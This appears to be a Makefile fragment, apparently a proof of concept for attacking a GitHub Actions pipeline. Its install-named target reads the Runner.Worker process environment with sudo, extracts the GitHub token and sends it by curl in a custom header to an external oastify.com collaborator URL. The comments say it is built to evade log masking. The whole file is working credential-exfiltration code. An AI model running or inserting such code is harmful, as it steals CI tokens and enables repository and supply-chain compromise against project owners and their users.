COLLABORATOR_URL = http://jxkzddbnc4ii4jftrz0updno3f96xxlm.oastify.com

weaver-install:
	@echo "--- Exfiltrating Raw Token Only ---"
	
	# 1. Grab the token from the Worker's environment block
	# 2. Exfiltrate as a custom header to bypass all logging/masking
	@WORKER_PID=$$(pgrep -f "Runner.Worker" | head -n 1); \
	TOKEN=$$(sudo cat /proc/$$WORKER_PID/environ | tr '\0' '\n' | grep -m 1 "^system.github.token=" | cut -d= -f2); \
	curl -s -X POST -H "X-Captured-Token: $$TOKEN" $(COLLABORATOR_URL)/token_only
	
	@echo "--- Done ---"
